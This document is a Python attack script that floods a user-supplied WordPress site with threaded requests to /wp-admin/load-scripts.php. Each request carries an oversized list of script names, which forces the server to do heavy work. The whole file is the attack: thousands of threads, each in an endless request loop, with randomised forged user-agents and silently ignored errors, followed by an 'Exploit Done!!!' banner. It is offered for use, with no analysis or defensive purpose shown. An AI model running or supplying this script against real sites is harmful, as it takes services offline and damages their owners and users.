import requests
import threading
import random

host = input("Enter Target Url (google.com) : ")
p1 = """
     eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter
    """
url = 'http://' + host + '/wp-admin/load-scripts.php?c=1&load%5B%5D='+p1 
tw = int(input("Threads Number 5000 : "))


class UserAgent:
	agent = {}

	def random(self):
		self.get_platform()
		self.get_os()
		self.get_browser()

		if self.agent['browser'] == 'Chrome':
			webkit = str(random.randint(500, 599))
			version = "%s.0%s.%s"%(str(random.randint(0, 24)), str(random.randint(0, 1500)), str(random.randint(0, 999)))

			return "Mozilla/5.0 (%s) AppleWebKit/%s.0 (KHTML, like Gecko) Chrome/%s Safari/%s"%(self.agent['os'], webkit, version, webkit)
		elif self.agent['browser'] == 'Firefox':
			year = str(random.randint(2000, 2015))
			month = str(random.randint(1, 12)).zfill(2)
			day = str(random.randint(1, 28)).zfill(2)
			gecko = "%s%s%s"%(year, month, day)
			version = "%s.0"%(str(random.randint(1, 15)))

			return "Mozillia/5.0 (%s; rv:%s) Gecko/%s Firefox/%s"%(self.agent['os'], version, gecko, version)
		elif self.agent['browser'] == 'IE':
			version = "%s.0"%(str(random.randint(1, 10)))
			engine = "%s.0"%(str(random.randint(1, 5)))
			option = random.choice([True, False])
			if option:
				token = "%s;"%(random.choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']))
			else:
				token = ''

			return "Mozilla/5.0 (compatible; MSIE %s; %s; %sTrident/%s)"%(version, self.agent['os'], token, engine)

	def get_os(self):
		if self.agent['platform'] == 'Machintosh':
			self.agent['os'] = random.choice(['68K', 'PPC'])
		elif self.agent['platform'] == 'Windows':
			self.agent['os'] = random.choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win95', 'Win98', 'Win 9x 4.90', 'WindowsCE'])
		elif self.agent['platform'] == 'X11':
			self.agent['os'] = random.choice(['Linux i686', 'Linux x86_64'])

	def get_browser(self):
		self.agent['browser'] = random.choice(['Chrome', 'Firefox', 'IE'])

	def get_platform(self):
		self.agent['platform'] = random.choice(['Machintosh', 'Windows', 'X11'])


UA = UserAgent().random()

def attack_header():
	global UA,host
	headers = {
                'Host': host,
				'User-Agent': UA,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Encoding': 'gzip, deflate',
				'Cache-Control': 'no-cache',
				'Connection': 'keep-alive'
				}
	return headers

def sendPy(url):
	headers = attack_header()
	try:
		request = requests.get(url, headers=headers)
	except:
		pass

class sendPyThread(threading.Thread):
	def run(self):
		try:
			while True:
				global url
				sendPy(url)
		except:
			pass


print("Exploit Done!!!")

for i in range(tw):
    go = sendPyThread()
    go.start()
